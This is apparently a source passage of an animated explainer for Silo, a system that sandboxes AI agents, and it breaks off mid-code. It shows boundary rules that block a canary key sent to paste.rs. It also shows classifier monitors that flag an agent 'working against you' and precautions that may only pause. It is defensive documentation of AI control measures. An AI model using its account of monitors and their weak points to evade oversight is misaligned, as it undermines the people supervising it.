explainer({
  title: "Rules and precautions",
  answer: "The less sure the trigger, the less it may do.",
  scenes: [
    { caption: "A rule: triggered by a fact.",
      source: "A rule is triggered by a fact and reads only facts. It is exact, and it may do anything you wrote in it." },
    { caption: "A precaution: triggered by a report or an opinion.",
      source: "A precaution is triggered by a report or an opinion. It can be wrong, so it takes only reversible actions: it never allows, never resumes and never stops a computer. (You first agreed \"pause or stop\". Stop is destructive, so a precaution no longer stops a computer.)" },
    { caption: "The less sure the trigger, the less it may do.",
      source: "Who or what triggers something decides what it may do: the less sure the trigger, the less it may do. You can do anything, at any time. A classifier never acts: its opinion leads to an action only through a precaution you set." },
    { caption: "Synchronous: the thing waits for the answer.",
      source: "A rule or a precaution is synchronous or asynchronous. Synchronous: the thing waits at the boundary for the answer. Asynchronous: nothing waits, and only the computer is left to act on." },
    { caption: "Asynchronous: nothing waits.",
      source: "A rule or a precaution is synchronous or asynchronous. Synchronous: the thing waits at the boundary for the answer. Asynchronous: nothing waits, and only the computer is left to act on." },
    { caption: "A classifier on each tool call.",
      source: "Through a precaution, a classifier can be asked synchronously on each tool call a model asks for." },
    { caption: "A denied tool call: the reply is changed.",
      source: "A denied tool call changes the model's reply at the boundary, and Silo records the original and the replacement." },
    { caption: "Rules are the promise. A precaution is extra caution.",
      source: "A classifier can be fooled, and a rule at the boundary cannot be got around. Rules are the promise, and a precaution is extra caution on top." },
  ],
  build(K, tl, scene, V) {
    const NS = "http://www.w3.org/2000/svg";
    const svg = (tag, attrs, parent, before) => {
      const e = document.createElementNS(NS, tag);
      for (const k in attrs) e.setAttribute(k, attrs[k]);
      if (before) parent.insertBefore(e, before); else parent.appendChild(e);
      return e;
    };
    const S = i => tl.labels["s" + i];
    const T = (s, x) => S(s) + x;                    // a time in scene s, as an absolute time on the timeline
    const dark = K.tone("bg") === "#0d1114";
    const place = (p, x, y) => { K.gsap.set(p, { x, y }); p._x = x; p._y = y; return p; };

    // The forms of the films before. Something that cannot happen: a grey chip with a line through its words.
    const strike = chip => svg("line", { x1: -chip.w / 2 + 9, x2: chip.w / 2 - 9, y1: 0, y2: 0, stroke: K.tone("muted"), "stroke-width": 1.8, "stroke-linecap": "round" }, chip);
    const cannot = (x, y, words) => { const c = K.chip(x, y, words, { tone: "muted", size: 15 }); strike(c); return c; };
    // A row's mark ("fact · network") brightens for a moment.
    const markPulse = (row, t) => tl.to(row.meta, { fill: K.tone("ink"), duration: 0.3, yoyo: true, repeat: 1, ease: "power2.inOut" }, t);
    // An opinion: a pill outside the record, in its own colour, with whose it is under it.
    const opinion = (x, y, words, whose) => [K.chip(x, y, words, { tone: "accent", size: 15 }), K.text(x, y + 32, whose, { size: 14, color: "muted" })];
    // A record row: locked, with its mark.
    const fact = (win, words, mark = "fact · network") => win.row(words, { mono: true, icon: "lock", meta: mark });
    // A card drawn smaller: its drawing is scaled inside the piece, and the piece takes the smaller size.
    const shrink = (p, k) => {
      const kids = [...p.childNodes], inner = svg("g", { transform: `scale(${k})` }, p);
      kids.forEach(c => inner.appendChild(c));
      Object.assign(p, { w: p.w * k, h: p.h * k, rx: p.rx * k });
      delete p.shade;
      return p;
    };
    // A rule: exact, so a solid card, with the icon of what it does (ban: it denies; check: it allows).
    const rule = (x, y, words, icon, o = {}) => K.card(x, y, words, { icon, ...o });
    // A precaution: not exact, so a dashed card, with a shield.
    const precaution = (x, y, words, o = {}) => K.card(x, y, words, { icon: "shield", dashed: true, ...o });
    // A computer: a region whose edge is drawn as a clear line. That edge is the boundary.
    const computer = (x, y, w, h) => {
      const r = K.region({ x, y, w, h }, "main", { icon: "machine" });
      r.box.setAttribute("stroke-width", 2.5);
      r.box.setAttribute("stroke", K.tone("muted"));
      return r;
    };
    // A veil over a computer's ground, under its name: pale when paused, dark when stopped.
    const veil = (r, fill) => svg("rect", { x: -r.w / 2, y: -r.h / 2, width: r.w, height: r.h, rx: 22, fill, opacity: 0 }, r, r.label && (r.icon || r.label));
    const pause = (r, progs, s, t) => {
      tl.to(veil(r, K.tone("surfaceHi")), { opacity: dark ? 0.75 : 0.85, duration: 0.6, ease: "power2.out" }, T(s, t));
      K.dim(progs, { to: 0.4, at: t });
    };
    // Stopped: dark, its programs gone, only its disk left.
    const stop = (r, progs, disk, s, t) => {
      tl.to(veil(r, dark ? "#000000" : "#14273a"), { opacity: dark ? 0.6 : 0.42, duration: 0.6, ease: "power2.out" }, T(s, t));
      K.hide(progs, { at: t });
      if (!dark) tl.to(r.label, { attr: { fill: "#eef0ee" }, duration: 0.6 }, T(s, t));
      K.appear(disk, { from: "pop", at: t + 0.4 });
    };
    // A program, named as a thing: a pill with three dots at its right that blink while it runs and hold still when it does not.
    const program = (x, y, name) => {
      const p = K.chip(x, y, name, { tone: "ink", icon: "process", size: 15 });
      const D = 34, w = p.w + D;                                   // room for the dots
      p.box.setAttribute("x", -w / 2); p.box.setAttribute("width", w); p.shade.fit(w);
      p.label.setAttribute("x", +p.label.getAttribute("x") - D / 2);
      K.gsap.set(p.icon, { x: +K.gsap.getProperty(p.icon, "x") - D / 2 });
      p.w = w;
      p.dots = [0, 1, 2].map(i => svg("circle", { cx: w / 2 - 33 + i * 10, cy: 0, r: 3.2, fill: K.tone("accent") }, p));
      return p;
    };
    const pair = (x, y1, y2) => [program(x, y1, "cargo build"), program(x, y2, "tests")];
    const run = (progs, s, t0, t1) => progs.forEach(p => p.dots.forEach((d, i) => {
      const n = Math.max(1, Math.floor((t1 - t0 - i * 0.16) / 0.42));
      tl.fromTo(d, { opacity: 1 }, { opacity: 0.18, duration: 0.42, repeat: n - 1, yoyo: true, ease: "sine.inOut", immediateRender: false }, S(s) + t0 + i * 0.16);
    }));
    // A link drawn only as far as the fraction f of its length, where it meets the boundary: nothing passes.
    const drawTo = (lk, s, t, f = 0.5, dur = 0.6) => {
      Object.assign(lk, { _shown: true, _op: 1 });
      if (lk.head) K.gsap.set(lk.head, { opacity: 0 });
      tl.set(lk, { opacity: 1 }, T(s, t));
      tl.fromTo(lk.path, { drawSVG: "0% 0%" }, { drawSVG: `0% ${f * 100}%`, duration: dur, ease: "power2.inOut", immediateRender: false }, T(s, t));
    };
    // The rest of that link, once the thing is let through.
    const onward = (lk, s, t, dur = 0.6) => {
      tl.to(lk.path, { drawSVG: "0% 100%", duration: dur, ease: "power2.inOut" }, T(s, t));
      if (lk.head) tl.to(lk.head, { opacity: 1, duration: 0.2 }, T(s, t + dur - 0.15));
    };
    // Where a chip riding a link stops: just before the fraction f, with 12 px to spare. The chip is put there.
    const parkBefore = (chip, lk, f = 0.5) => {
      const len = lk.path.getTotalLength(), m = lk.path.getPointAtLength(len * f), a = lk.path.getPointAtLength(len * f - 1);
      const reach = Math.abs(m.x - a.x) * chip.w / 2 + Math.abs(m.y - a.y) * chip.h / 2 + 12;
      const stop = Math.max(0.02, f - reach / len), p = lk.path.getPointAtLength(len * stop);
      K.gsap.set(chip, { x: p.x, y: p.y });
      Object.assign(chip, { _x: p.x, _y: p.y, _stop: stop });
    };
    // The chip leaves the start of the link and rides to where it was parked.
    const ride = (chip, lk, s, t, dur = 1.1) => {
      Object.assign(chip, { _shown: true, _op: 1 });
      tl.fromTo(chip, { opacity: 0, scale: 0.8 }, { opacity: 1, scale: 1, duration: 0.3, ease: "power2.out", immediateRender: false }, T(s, t));
      tl.to(chip, { motionPath: { path: lk.path, start: 0, end: chip._stop }, duration: dur, ease: "power2.inOut", immediateRender: false }, T(s, t));
    };
    // After a cut, the arrowhead stays away: that link never reached its end.
    const noHead = (lk, s, t) => { if (lk.head) tl.set(lk.head, { opacity: 0 }, T(s, t)); };
    // A deny at the boundary where it is not the link's middle: the same red cut as the kit's, at the fraction f.
    let cuts = 0;
    const cutAt = (lk, s, t, f) => {
      const m = lk.path.getPointAtLength(lk.path.getTotalLength() * f), id = "rp-cut-" + (cuts++);
      const mask = svg("mask", { id, maskUnits: "userSpaceOnUse", x: -1280, y: -720, width: 3840, height: 2160 }, lk);
      svg("rect", { x: -1280, y: -720, width: 3840, height: 2160, fill: "#fff" }, mask);
      const gap = svg("circle", { cx: m.x, cy: m.y, r: 0, fill: "#000" }, mask);
      lk.body.setAttribute("mask", `url(#${id})`);
      const x = svg("path", { d: "M-5 -5 L5 5 M5 -5 L-5 5", stroke: K.tone("bad"), "stroke-width": 2.25, "stroke-linecap": "round", opacity: 0 }, lk);
      K.gsap.set(x, { x: m.x, y: m.y, svgOrigin: "0 0" });
      tl.to(gap, { attr: { r: 15 }, duration: 0.45, ease: "power2.out" }, T(s, t));
      tl.fromTo(x, { opacity: 0, scale: 0.4, rotation: -45 }, { opacity: 1, scale: 1, rotation: 0, duration: 0.45, ease: "power2.out", immediateRender: false }, T(s, t + 0.05));
      tl.to(lk.path, { stroke: K.tone("bad"), duration: 0.4 }, T(s, t));
      tl.to(lk.body, { opacity: 0.5, duration: 0.5 }, T(s, t + 0.1));
    };

    // ---------- 1. A rule. Left: "main", its right edge the boundary. Right: the rule, you, and the record. ----------
    const E1 = 470;
    const main1 = computer(270, 375, 400, 450);              // x 70..470, y 150..600
    const agent1 = K.actor(270, 255, "agent", "agent");
    const progs1 = pair(270, 425, 485);
    const disk1 = K.chip(270, 455, "disk", { tone: "ink", icon: "database", size: 15 });
    const aR = agent1.at("right");
    const host1 = K.card(2 * E1 - (aR.x + 6) + 9 + 85, aR.y, "paste.rs", { icon: "globe", w: 170 });   // the link's middle is on the edge
    const rule1 = rule(860, 112, "if canary-key is about to leave: deny, stop main, alert", "ban");
    const same1 = K.text(rule1._x - rule1.w / 2 + rule1._lead, 112 + 30 + 22, "the same thing always gets the same answer", { size: 15, color: "muted", anchor: "start" });
    const you1 = K.actor(1110, 345, "you", "you", { tone: "you" });
    const record1 = K.window(880, 545, "The record", { w: 680, icon: "list" });
    const row1 = fact(record1, "connection  carried canary-key  denied by rule v1");
    const out1 = K.link(agent1, host1, { tone: "ink", from: "right", to: "left" });
    const canary = K.chip(0, 0, "canary-key", { tone: "ink", icon: "key", mono: true, size: 14 });
    parkBefore(canary, out1);
    const edge1 = svg("line", { x1: 200, x2: 200, y1: aR.y - 375 - 38, y2: aR.y - 375 + 38, stroke: K.tone("accent"), "stroke-width": 6, "stroke-linecap": "round", opacity: 0 }, main1);
    const seen1 = K.text(E1 + 12, aR.y - 40, "seen here", { size: 16, color: "accent", anchor: "start" });
    const alert1 = K.link({ x: rule1._x + rule1.w / 2 - 40, y: 112 + 30 + 6 }, you1, { tone: "ink", from: "bottom", to: "top" });   // leaves the rule card clear of its words
    const alertChip1 = K.chip(0, 0, "alert", { tone: "warn", icon: "bell", size: 15 });
    const toRec1 = K.link({ x: E1 + 16, y: aR.y + 22 }, record1, { tone: "ink", to: "top" });
    const recChip1 = K.chip(0, 0, "connection", { tone: "ink", icon: "link", size: 14 });

    // 1. "main", the boundary and the empty record are there from the start; the rule is set. A fake secret goes toward
    //    paste.rs and reaches the boundary; the boundary sees it and the rule lights. Then, in order: the cut at the
    //    boundary, the computer goes dark with only its disk left, the alert reaches you. Last, the row lands in the record
    //    and then its mark pulses. Hero: the rule's three actions, one after the other.
    scene(0);
    K.camera(null, { dur: 0 });
    K.appear(main1, { from: "fade", at: 0.1 });
    K.appear(agent1, { from: "pop", at: "<0.2" });
    K.appear(progs1, { at: "<0.2", stagger: 0.12 });
    K.appear(record1, { at: "<0.2" });
    K.appear(rule1, { at: V.word(0, 0, "A rule") });
    K.appear(same1, { from: "fade", at: V.word(0, 1, "exact") });
    K.appear(you1, { from: "pop", at: V.word(0, 2, "anything you wrote") });
    K.pulse(rule1, { tone: "ink", at: "<0.2" });
    K.appear(host1, { at: V.word(0, 3, "a fake secret") - 0.3 });
    drawTo(out1, 0, V.word(0, 3, "a fake secret"));
    ride(canary, out1, 0, V.word(0, 3, "a fake secret") + 0.3, 1.8);
    const tSeen = V.word(0, 3, "leave the computer");
    tl.to(edge1, { opacity: 1, duration: 0.3, yoyo: true, repeat: 1, repeatDelay: 0.5, ease: "power2.inOut" }, T(0, tSeen));
    K.appear(seen1, { from: "fade", at: tSeen });
    K.glow(rule1, { tone: "ink", at: tSeen + 0.3 });
    const tDeny = V.word(0, 4, "denies it");
    K.cut(out1, { at: tDeny });
    noHead(out1, 0, tDeny + 0.1);
    const tStop = Math.max(V.word(0, 4, "stops the computer"), tDeny + 0.6);
    stop(main1, [agent1, ...progs1], disk1, 0, tStop);
    // Dimmed: its words and key fade, while its ground stays solid over the cut line, so it does not read as struck through.
    tl.to([canary.label, canary.icon], { opacity: 0.4, duration: 0.5, ease: "power2.out" }, T(0, tStop));
    K.draw(alert1, { at: Math.max(V.word(0, 4, "alerts you") - 0.3, tStop + 0.5), dur: 0.6 });
    K.travel(alertChip1, alert1, { land: "dock", dur: 0.8, at: ">-0.1" });
    K.draw(toRec1, { at: ">-0.2", dur: 0.6 });
    K.travel(recChip1, toRec1, { dur: 0.7, at: ">-0.1" });
    K.appear(row1, { from: "fade", at: ">-0.1", dur: 0.5 });
    markPulse(row1, tl.duration() + 0.1);
    run(progs1, 0, 0.3, tStop);

    // ---------- 2. A precaution. The record and the classifier at the left, the precautions in the middle, "main" at the right. ----------
    const rec2 = K.window(300, 180, "The record", { w: 460, icon: "list" });
    const rRep = rec2.row("own account  3 model calls", { mono: true, icon: "lock", muted: true, meta: "report · inside" });
    const rFact = fact(rec2, "4 model calls seen");
    const yA = rRep.at("top").y + 2, yB = rFact.at("bottom").y - 2, xB = rec2.at("right").x + 12;
    const neq2 = K.text(xB + 22, (yA + yB) / 2, "3 ≠ 4", { size: 18, weight: 600, anchor: "start" });
    svg("path", { d: `M${-22} ${yA - (yA + yB) / 2} h8 V${yB - (yA + yB) / 2} h-8 M-14 0 h6`, fill: "none", stroke: K.tone("muted"), "stroke-width": 1.8, "stroke-linecap": "round", "stroke-linejoin": "round" }, neq2);
    const prec2b = shrink(precaution(0, 0, "on a mismatch: alert"), 0.8);
    const cls2 = K.card(215, 375, "small model", { sub: "a classifier", icon: "model", w: 200 });
    const [op2, op2Who] = opinion(475, 375, "working against you?", "small model");
    const prec2 = precaution(475, 525, "on that opinion: pause main, alert");
    const no2 = ["allow", "resume", "stop"].map((w, i) => cannot(475 + (i - 1) * 112, 525 + prec2.h / 2 + 24, w));
    const main2 = computer(1100, 290, 230, 400);             // x 985..1215, y 90..490
    place(prec2b, Math.min(xB + 22 + neq2.w + 70 + prec2b.w / 2, 985 - 50 - prec2b.w / 2), (yA + yB) / 2);
    const agent2 = K.actor(1100, 172, "agent", "agent");
    const progs2 = pair(1100, 310, 370);
    const you2 = K.actor(1100, 598, "you", "you", { tone: "you" });
    const read2 = K.link(rec2, cls2, { tone: "muted", dashed: true, from: "bottom", to: "top" });
    const opTo2 = K.link(op2Who, prec2, { tone: "accent" });
    const misTo2 = K.link({ x: xB + 22 + neq2.w + 8, y: (yA + yB) / 2 }, prec2b, { tone: "muted", to: "left" });   // from the end of "3 ≠ 4"
    const unwritten2 = K.text(475, no2[0]._y + 34, "cannot be written", { size: 14, color: "muted" });
    const outside2 = K.text(prec2._x - prec2.w / 2 - 16, 525, "kept outside the computer", { size: 14, color: "muted", anchor: "end" });
    const pause2 = K.link(prec2, main2, { tone: "ink", from: "right", to: "left" });
    const alert2 = K.link(prec2, you2, { tone: "ink", from: "right", to: "left" });
    const alertChip2 = K.chip(0, 0, "alert", { tone: "warn", icon: "bell", size: 15 });

    // 2. A classifier reads the record and gives an opinion, outside the record; the opinion's link reaches the
    //    precaution card. A report set against a fact goes to a second, smaller one. Only then does the action leave the
    //    precaution card: an alert to you, and main paused, still and pale. Hero: the paused computer, and the three
    //    struck-through chips on the card.
    scene(1);
    K.hide([main1, disk1, canary, host1, rule1, same1, you1, record1, row1, out1, seen1, alert1, alertChip1, toRec1, recChip1], { at: 0 });
    K.appear(rec2, { at: 0.2 });
    K.appear([rRep, rFact], { from: "fade", stagger: 0.15, at: "<0.3" });
    K.appear(main2, { from: "fade", at: "<" });
    K.appear(agent2, { from: "pop", at: "<0.2" });
    K.appear(progs2, { at: "<0.2", stagger: 0.12 });
    K.appear(you2, { from: "pop", at: "<0.2" });
    K.appear(prec2, { at: V.word(1, 0, "A precaution") });
    K.appear(cls2, { at: V.word(1, 1, "a classifier") - 0.2 });
    K.draw(read2, { at: "<0.3", dur: 0.6 });
    const tOp2 = Math.max(V.word(1, 1, "working against you") - 0.2, V.word(1, 1, "a classifier") + 0.9);
    K.appear([op2, op2Who], { from: "right", at: tOp2 });
    K.draw(opTo2, { at: tOp2 + 0.4, dur: 0.6 });
    K.pulse(prec2, { tone: "accent", at: tOp2 + 0.95 });
    markPulse(rRep, T(1, V.word(1, 2, "own account")));
    markPulse(rFact, T(1, V.word(1, 2, "what Silo saw")));
    K.appear(neq2, { from: "fade", at: V.word(1, 2, "does not match") });
    K.appear(prec2b, { at: "<0.2" });
    K.draw(misTo2, { at: "<0.3", dur: 0.6 });
    K.pulse(prec2b, { tone: "accent", at: ">-0.1" });
    K.draw(alert2, { at: Math.max(V.word(1, 3, "such as alert"), tOp2 + 1.2) });
    K.travel(alertChip2, alert2, { land: "dock", dur: 0.9, at: ">-0.1" });
    const tPause2 = Math.max(V.word(1, 3, "pause") - 0.4, V.word(1, 3, "such as alert") + 1.4);
    K.draw(pause2, { at: tPause2 });
    pause(main2, [agent2, ...progs2], 1, tPause2 + 0.8);
    K.appear(no2[0], { from: "pop", at: V.word(1, 4, "never allows") });
    K.appear(no2[1], { from: "pop", at: V.word(1, 4, "never resumes") });
    K.appear(no2[2], { from: "pop", at: V.word(1, 4, "never stops") });
    K.appear(unwritten2, { from: "fade", at: V.word(1, 5, "cannot even be written") });
    K.appear(outside2, { from: "fade", at: V.word(1, 6, "kept outside the computer") });
    run(progs2, 1, 0.5, tPause2 + 0.8);

    // ---------- 3. Who triggers decides what it may do. Three rows, right-aligned; the three kinds at the right. ----------
    const RX = 790;
    const rowOf = (y, parts, colors) => {
      const ts = parts.map((p, i) => K.text(0, y, p, { size: 19, mono: true, anchor: "start", color: colors[i] || "ink" }));
      let x = RX - ts.reduce((a, t) => a + t.w, 0);
      ts.forEach(t => { K.gsap.set(t, { x }); t._x = x; x += t.w; });
      return ts;
    };
    const ar = "  →  ";
    const r1 = rowOf(150, ["you", ar, "anything"], ["you", "muted"]);
    const r2 = rowOf(320, ["a fact", ar, "a rule", ar, "anything the rule says"], ["ink", "muted", "ink", "muted"]);
    const r3 = rowOf(530, ["a report or an opinion", ar, "a precaution", ar, "reversible only"], ["ink", "muted", "ink", "muted"]);
    const kinds = [["granting", 150], ["destructive", 320], ["reversible", 530]].map(([n, y]) => K.card(1110, y, n, { w: 200 }));
    const [kGrant, kDest, kRev] = kinds;
    const reach = (y, kind, off, tn) => K.link({ x: RX + 14, y }, { x: kind.at("left").x - 4, y: kind._y + off }, { tone: tn });
    const l1 = [reach(150, kGrant, -10, "you"), reach(150, kDest, -10, "you"), reach(150, kRev, -18, "you")];
    const l2 = [reach(320, kGrant, 10, "accent"), reach(320, kDest, 10, "accent"), reach(320, kRev, 0, "accent")];
    const l3 = reach(530, kRev, 18, "ink");
    const choice3 = K.text(r2[4]._x, 356, "what Silo offers in a rule is a product choice", { size: 14, color: "muted", anchor: "start" });
    // The budget, an example under the left end of the second and of the third row.
    const budgetC = K.text(r2[0]._x + r2[0].w / 2, 356, "a budget on a computer", { size: 14, color: "muted" });
    const budgetR = K.text(r3[0]._x + r3[0].w / 2, 564, "a budget on a run", { size: 14, color: "muted" });
    const cls3 = shrink(K.card(0, 0, "small model", { sub: "gives opinions, never acts", icon: "model" }), 0.94);
    place(cls3, r3[0]._x + cls3.w / 2, 628);
    // The detour: a small record row at the end of the third row, "precaution acted" with its mark, and a dashed grey
    // line with no arrowhead from it toward "a rule". A grey ✕ crosses it: no rule may be triggered by it.
    const acted = K.chip(0, 0, "precaution acted", { tone: "ink", icon: "lock", mono: true, size: 15 });
    const actedMark = K.text(RX, 462, "fact", { size: 14, mono: true, color: "muted", anchor: "end" });
    place(acted, RX - actedMark.w - 14 - acted.w / 2, 462);
    const detour = K.link(acted, { x: r2[2]._x + r2[2].w / 2, y: 320 + 16 }, { tone: "muted", dashed: true, arrow: false, from: "left", to: "bottom" });
    const dm = detour.path.getPointAtLength(detour.len * 0.5);
    const cross3 = K.text(dm.x, dm.y, "", { size: 14 });
    ["M-11 -11 L11 11", "M11 -11 L-11 11"].forEach(d => svg("path", { d, stroke: K.tone("muted"), "stroke-width": 3, "stroke-linecap": "round" }, cross3));
    const detourSays = K.text(dm.x - 24, dm.y + 4, "no detour", { size: 16, color: "muted", anchor: "end" });

    // 3. The three kinds stand at the right, in one colour. The rows come one by one as the voice says them, each linked
    //    to the kinds it reaches. Hero: the third row reaching only "reversible". Then the classifier, which never acts,
    //    and the detour: the precaution acted is a fact, and the line from it to a rule is crossed out.
    scene(2);
    K.hide([rec2, rRep, rFact, neq2, cls2, op2, op2Who, prec2, ...no2, unwritten2, outside2, prec2b, main2, agent2, ...progs2, you2, read2, opTo2, misTo2, pause2, alert2, alertChip2], { at: 0 });
    K.appear(kinds, { from: "right", stagger: 0.15, at: V.at(2, 0) + 0.3 });
    K.appear(r1, { from: "fade", stagger: 0.12, at: V.at(2, 1) });
    K.draw(l1, { at: V.word(2, 1, "anything") });
    K.appear(r2, { from: "fade", stagger: 0.15, at: V.at(2, 2) });
    K.draw(l2, { at: V.word(2, 2, "does what the rule says") });
    K.appear(choice3, { from: "fade", at: ">" });
    K.appear(r3, { from: "fade", stagger: 0.18, at: V.at(2, 3) });
    K.draw(l3, { at: V.word(2, 3, "only what can be undone") });
    K.spotlight([...r3, l3, kRev], { at: "<" });
    K.glow(kRev, { tone: "ink", at: "<0.2" });
    K.spotlight(null, { at: V.at(2, 4) });
    K.appear(budgetC, { from: "fade", at: V.word(2, 5, "On a computer") });
    K.appear(budgetR, { from: "fade", at: V.word(2, 6, "On a run") });
    K.pulse(kGrant, { tone: "ink", at: V.word(2, 7, "A wrong grant") });
    K.pulse(kRev, { tone: "ink", at: V.word(2, 8, "A wrong pause") });
    K.appear(cls3, { from: "below", at: V.word(2, 9, "A classifier") });
    K.appear([acted, actedMark], { from: "fade", at: V.word(2, 11, "is itself a fact") });
    K.draw(detour, { at: ">", dur: 0.7 });
    K.appear(cross3, { from: "pop", at: V.word(2, 12, "No rule") });
    K.appear(detourSays, { from: "fade", at: "<0.2" });

    // ---------- 4 and 5. Two halves each, a thin line between them: a rule at the left, a precaution at the right. ----------
    // Each half: "main", its top edge the boundary, and at its right a column for the rule or the precaution.
    const B4 = 260, CW4 = 220, COL = 300;
    const cxA = 170, xcA = 470, cxB = 770, xcB = 1070;
    const midA = (cxA - CW4 / 2 + xcA + COL / 2) / 2, midB = (cxB - CW4 / 2 + xcB + COL / 2) / 2;
    const half = (cx, host, words, icon) => {
      const r = computer(cx, 420, CW4, 320);                 // y 260..580
      const ax = cx + 40, a = K.actor(ax, 395, "agent", "agent");
      const o = { r, a, p: [program(cx, 525, "cargo build")] };
      if (host) {
        const top = a.at("top").y - 6;
        o.h = K.card(ax, 2 * B4 - top - 9 - 30, host[0], { icon: host[1], w: 140 });   // the link's middle is on the edge
        o.lk = K.link(a, o.h, { tone: "ink", from: "top", to: "bottom" });
        o.c = K.chip(0, 0, words, { tone: "ink", icon, size: 14 });
      }
      return o;
    };
    // The word over the whole frame, the two halves' titles and the thin line between them.
    const heads = word => [K.text(640, 40, word, { size: 26, weight: 600 }),
                           K.text(midA, 84, "rule", { size: 19, weight: 600, color: "muted" }),
                           K.text(midB, 84, "precaution", { size: 19, weight: 600, color: "muted" })];
    const sepLine = () => K.link({ x: 640, y: 100 }, { x: 640, y: 600 }, { tone: "faint", arrow: false });
    // The boundary, a computer's top edge, lights for a moment.
    const edgeFlash = (r, s, t) => {
      const e = svg("line", { x1: -r.w / 2 + 24, x2: r.w / 2 - 24, y1: -r.h / 2, y2: -r.h / 2, stroke: K.tone("accent"), "stroke-width": 6, "stroke-linecap": "round", opacity: 0 }, r);
      tl.to(e, { opacity: 1, duration: 0.3, yoyo: true, repeat: 1, repeatDelay: 0.5, ease: "power2.inOut" }, T(s, t));
    };
    const fitCol = p => shrink(p, Math.min(0.85, COL / p.w));

    // Scene 4: synchronous. Left, a rule: the model call waits at the boundary and is denied on the spot.
    const A4 = half(cxA, ["model", "model"], "model call", "message");
    const P4 = half(cxB, ["host", "globe"], "connection", "link");
    parkBefore(A4.c, A4.lk);
    parkBefore(P4.c, P4.lk);
    const [head4, titleA4, titleP4] = heads("synchronous"), sep4 = sepLine();
    const rule4 = fitCol(rule(0, 0, "budget of main reached: deny", "ban"));
    place(rule4, xcA, 395);
    const spot4 = K.text(xcA, 395 + rule4.h / 2 + 24, "a fact, known on the spot", { size: 15, color: "muted" });
    const counted4 = K.text(A4.a._x + 16, B4 - 18, "counted here: $20 of $20", { size: 15, color: "accent", anchor: "start" });
    const actA4 = K.link(rule4, { x: A4.c._x + 32, y: A4.c._y + A4.c.h / 2 + 9 }, { tone: "ink", from: "left", to: "bottom" });
    // Right, a precaution: the connection waits for the classifier's opinion, and only that opinion's precaution denies it.
    const clsP4 = K.card(xcB, 180, "small model", { sub: "a classifier", icon: "model", w: 200 });
    const [opP4, opP4Who] = opinion(xcB, 268, "not safe", "small model");
    const precP4 = fitCol(precaution(0, 0, "on not safe: deny"));
    place(precP4, xcB, 415);
    const readP4 = K.link(P4.c, clsP4, { tone: "muted", dashed: true, from: "right", to: "left" });
    const opToP4 = K.link(opP4Who, precP4, { tone: "accent" });
    const denyP4 = K.chip(0, 0, "deny", { tone: "ink", size: 14 });
    const actP4 = K.link(precP4, { x: P4.c._x + 32, y: P4.c._y + P4.c.h / 2 + 9 }, { tone: "ink", from: "left", to: "bottom" });   // the chip's right end is the read link's
    const kinds4 = K.text(640, 640, "rule: any kind · precaution: reversible only", { size: 17, color: "muted" });

    // 4. Both things wait at the boundary. Left: the budget is counted there, the rule lights and the model call is cut at
    //    once; no classifier, no ask. Right: the connection waits while the classifier looks at it; its opinion's link
    //    reaches the precaution card, and only then does the deny leave that card and the cut come at the boundary.
    //    Hero: the two chips at the boundary, the left one answered at once, the right one waiting for an opinion.
    scene(3);
    K.hide([...kinds, ...r1, ...r2, ...r3, ...l1, ...l2, l3, choice3, budgetC, budgetR, cls3, acted, actedMark, detour, cross3, detourSays], { at: 0 });
    K.appear([A4.r, P4.r], { from: "fade", at: 0.2 });
    K.appear([A4.a, P4.a], { from: "pop", at: "<0.2" });
    K.appear([...A4.p, ...P4.p, A4.h, P4.h], { at: "<0.2", stagger: 0.06 });
    K.draw(sep4, { at: 0.3, dur: 0.6 });
    K.appear(titleA4, { from: "fade", at: V.word(3, 0, "A rule") });
    K.appear(titleP4, { from: "fade", at: V.word(3, 0, "a precaution") });
    K.appear(head4, { from: "fade", at: V.word(3, 0, "synchronous") });
    K.appear([rule4, clsP4, precP4], { at: V.end(3, 0) - 0.4, stagger: 0.08 });
    edgeFlash(A4.r, 3, V.word(3, 1, "waits at the boundary"));
    edgeFlash(P4.r, 3, V.word(3, 1, "waits at the boundary"));
    K.pulse(rule4, { tone: "ink", at: V.word(3, 2, "A rule answers") });
    K.appear(spot4, { from: "fade", at: V.word(3, 2, "a fact is known") });
    const t0A = V.at(3, 3);
    drawTo(A4.lk, 3, t0A);
    ride(A4.c, A4.lk, 3, t0A + 0.2, 1.0);
    K.appear(counted4, { from: "fade", at: Math.max(V.word(3, 3, "budget of main"), t0A + 1.2) });
    const tCutA = Math.max(V.word(3, 3, "is denied"), t0A + 2.1);
    K.glow(rule4, { tone: "ink", at: tCutA - 0.55 });
    K.draw(actA4, { at: tCutA - 0.4, dur: 0.35 });
    K.cut(A4.lk, { at: tCutA });
    noHead(A4.lk, 3, tCutA + 0.1);
    const t0P = V.at(3, 4);
    drawTo(P4.lk, 3, t0P);
    ride(P4.c, P4.lk, 3, t0P + 0.2, 1.2);
    const tRead = Math.max(V.word(3, 4, "a classifier's opinion") - 0.3, t0P + 1.4);
    K.draw(readP4, { at: tRead, dur: 0.5 });
    K.pulse(clsP4, { tone: "accent", at: tRead + 0.45 });
    const tOpP = Math.max(V.word(3, 5, "not safe") - 0.3, tRead + 0.7);
    K.appear([opP4, opP4Who], { from: "right", at: tOpP, dur: 0.5 });
    K.draw(opToP4, { at: tOpP + 0.35, dur: 0.5 });
    K.pulse(precP4, { tone: "accent", at: tOpP + 0.8 });                // the opinion's link has reached the card
    K.draw(actP4, { at: tOpP + 0.95, dur: 0.5 });                       // only now does the deny leave it
    K.travel(denyP4, actP4, { land: "absorb", dur: 0.6, at: tOpP + 1.3 });
    const tCutP = Math.max(V.word(3, 5, "denies it"), tOpP + 1.95);
    K.cut(P4.lk, { at: tCutP });
    noHead(P4.lk, 3, tCutP + 0.1);
    K.appear(kinds4, { from: "fade", at: tCutP + 0.5 });
    run(A4.p, 3, 0.4, V.total(3) - 1.5);
    run(P4.p, 3, 0.4, V.total(3) - 1.5);

    // Scene 5: asynchronous. Left, a rule on a meter: the memory of the Mac, outside the computer.
    const A5 = half(cxA, null);
    const P5 = half(cxB, ["host", "globe"], "connection", "link");
    const [head5, titleA5, titleP5] = heads("asynchronous"), sep5 = sepLine();
    const gauge5 = K.card(xcA - 40, 175, "memory of the Mac", { sub: " ", icon: "layers", w: 260 });
    const gx0 = -gauge5.w / 2 + gauge5._lead, gW = gauge5.w - gauge5._lead - 24 - 44;
    svg("rect", { x: gx0, y: 10, width: gW, height: 9, rx: 4.5, fill: K.tone("faint"), opacity: 0.45 }, gauge5);
    const gFill = svg("rect", { x: gx0, y: 10, width: gW * 0.45, height: 9, rx: 4.5, fill: K.tone("muted") }, gauge5);
    const gLow = gauge5.sub.cloneNode(true);
